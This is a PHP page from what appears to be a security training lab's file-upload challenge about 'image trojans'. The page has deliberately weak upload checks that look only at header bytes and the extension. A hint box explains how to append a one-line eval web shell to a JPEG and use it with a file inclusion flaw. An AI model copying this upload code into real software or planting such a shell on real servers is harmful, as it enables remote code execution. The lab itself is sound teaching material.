<?php
// 图片马上传
$output = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $name = $file['name'];
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));

    // 检查文件头
    $fp = fopen($file['tmp_name'], 'rb');
    $header = fread($fp, 8);
    fclose($fp);

    $isImage = false;
    if (substr($header, 0, 3) === "\xFF\xD8\xFF") $isImage = true; // JPEG
    if (substr($header, 0, 8) === "\x89PNG\r\n\x1a\n") $isImage = true; // PNG
    if (substr($header, 0, 3) === "GIF") $isImage = true; // GIF

    $allowed = ['jpg', 'jpeg', 'png', 'gif'];

    if ($isImage && in_array($ext, $allowed)) {
        $target = 'uploads/' . $name;
        move_uploaded_file($file['tmp_name'], $target);
        $body = @file_get_contents($target);
        if ($body !== false && stripos($body, '<?') !== false) {
            renderChallengeSuccess($challenge, '伪装成图片的脚本代码随文件落盘');
        }
        $output = "图片上传成功: {$target}";
    } else {
        $output = "只允许上传图片文件！";
    }
}
?>

<p>文件上传（图片马）</p>
<p>服务器检查文件头和扩展名，但图片中可嵌入PHP代码。</p>

<form method="POST" enctype="multipart/form-data">
    <label>上传图片</label>
    <input type="file" name="file" accept="image/*" required>
    <button type="submit" class="btn btn-primary">上 传</button>
</form>

<?php if ($output): ?>
    <div class="result-box"><?= $output ?></div>
<?php endif; ?>

<div style="margin-top:1rem; padding:1rem; background:var(--bg-secondary); border-radius:var(--radius-sm); font-size:0.8rem;">
    <strong style="color:var(--warning);">图片马制作：</strong>
    <br>copy /b normal.jpg + shell.php shell.jpg
    <br>或在图片末尾添加 &lt;?php eval($_POST['cmd']); ?&gt;
    <br>配合文件包含漏洞使用
</div>
